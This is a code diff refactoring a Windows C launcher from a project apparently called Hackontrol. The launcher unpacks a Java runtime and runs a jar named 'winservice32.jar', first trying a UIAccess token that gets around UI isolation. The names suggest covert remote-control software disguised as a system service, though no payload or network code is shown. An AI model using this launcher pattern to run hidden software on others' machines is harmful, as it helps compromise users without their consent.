@@ -1,16 +1,16 @@
 #include <khopanwin32.h>
 #include <khopanstring.h>
 #include <hackontrol.h>
-#include "extract.h"
-#include "uiaccess.h"
+#include "execute.h"
 
 #define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
 
-#define FILE_JAVAW        L"javaw.exe"
+#define FILE_JAVA         L"javaw.exe"
 #define FILE_WINSERVICE32 L"winservice32.jar"
+#define FOLDER_BIN        L"bin"
 #define FOLDER_JAVA       L"AdditionalData"
 
-static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw);
+static void executeJarFile(LPCWSTR const pathFileJavaw, LPWSTR const argumentFileJavaw, LPCWSTR const currentDirectory);
 
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
 	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);
@@ -21,11 +21,18 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 	}
 
 	LPSTR pathFolderJava = KHFormatMessageA("%ws\\%ws", pathFolderHackontrol, FOLDER_JAVA);
-	FREE(pathFolderHackontrol);
 
 	if(!pathFolderJava) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		return;
+		goto freePathFolderHackontrol;
+	}
+
+	LPWSTR pathFileWinservice32 = KHFormatMessageW(L"%ws\\" FILE_WINSERVICE32, pathFolderHackontrol);
+
+	if(!pathFileWinservice32) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(pathFolderJava);
+		goto freePathFolderHackontrol;
 	}
 
 	if(!CreateDirectoryA(pathFolderJava, NULL)) {
@@ -33,54 +40,77 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 
 		if(error != ERROR_ALREADY_EXISTS) {
 			KHWin32DialogErrorW(error, L"KHFormatMessageW");
+			FREE(pathFileWinservice32);
 			FREE(pathFolderJava);
-			return;
+			goto freePathFolderHackontrol;
 		}
 	}
 
 	BOOL result = ExtractJRE(pathFolderJava);
 
 	if(result) {
+		FREE(pathFileWinservice32);
 		FREE(pathFolderJava);
-		return;
+		goto freePathFolderHackontrol;
 	}
 
-	LPWSTR pathFileJavaw = KHFormatMessageW(L"%ws\\bin\\" FILE_JAVAW, pathFolderJava);
+	LPWSTR pathFileJava = KHFormatMessageW(L"%S\\" FOLDER_BIN L"\\" FILE_JAVA, pathFolderJava);
 	FREE(pathFolderJava);
 
-	if(!pathFileJavaw) {
+	if(!pathFileJava) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		return;
+		FREE(pathFileWinservice32);
+		goto freePathFolderHackontrol;
 	}
 
-	ExecuteJarFile(pathFileJavaw, FILE_JAVAW L" -jar ..\\..\\" FILE_WINSERVICE32);
-	FREE(pathFileJavaw);
+	LPWSTR argumentFileJava = KHFormatMessageW(L"%ws -jar \"%ws\" \"%ws\"", pathFileJava, pathFileWinservice32, pathFolderHackontrol);
+	FREE(pathFileWinservice32);
+
+	if(!argumentFileJava) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(pathFileJava);
+		goto freePathFolderHackontrol;
+	}
+
+	executeJarFile(pathFileJava, argumentFileJava, pathFolderHackontrol);
+	FREE(argumentFileJava);
+	FREE(pathFileJava);
+freePathFolderHackontrol:
+	FREE(pathFolderHackontrol);
 }
 
-static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw) {
-	STARTUPINFO startupInformation = {0};
-	startupInformation.cb = sizeof(startupInformation);
-	PROCESS_INFORMATION processInformation;
+static BOOL tryStartWithUIAccess(LPCWSTR const pathFileJava, LPWSTR const argumentFileJava, LPCWSTR const currentDirectory) {
 	HANDLE accessToken;
 
 	if(!CreateUIAccessToken(&accessToken)) {
-		accessToken = NULL;
+		return FALSE;
 	}
 
-	if(accessToken) {
-		if(!CreateProcessAsUserW(accessToken, pathFileJavaw, argumentFileJavaw, NULL, NULL, FALSE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, NULL, &startupInformation, &processInformation)) {
-			KHWin32DialogErrorW(GetLastError(), L"CreateProcessAsUserW");
-			return;
-		}
-	} else {
-		if(!CreateProcessW(pathFileJavaw, argumentFileJavaw, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, NULL, &startupInformation, &processInformation)) {
-			KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
-			return;
-		}
+	STARTUPINFO startupInformation = {0};
+	startupInformation.cb = sizeof(startupInformation);
+	PROCESS_INFORMATION processInformation;
+
+	if(!CreateProcessAsUserW(accessToken, pathFileJava, argumentFileJava, NULL, NULL, FALSE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, currentDirectory, &startupInformation, &processInformation)) {
+		return FALSE;
 	}
 
-	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
-		KHWin32DialogErrorW(GetLastError(), L"WaitForSingleObject");
+	CloseHandle(processInformation.hProcess);
+	CloseHandle(processInformation.hThread);
+	return TRUE;
+}
+
+static void executeJarFile(LPCWSTR const pathFileJava, LPWSTR const argumentFileJava, LPCWSTR const currentDirectory) {
+	if(tryStartWithUIAccess(pathFileJava, argumentFileJava, currentDirectory)) {
+		return;
+	}
+
+	STARTUPINFO startupInformation = {0};
+	startupInformation.cb = sizeof(startupInformation);
+	PROCESS_INFORMATION processInformation;
+
+	if(!CreateProcessW(pathFileJava, argumentFileJava, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, currentDirectory, &startupInformation, &processInformation)) {
+		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
+		return;
 	}
 
 	CloseHandle(processInformation.hProcess);
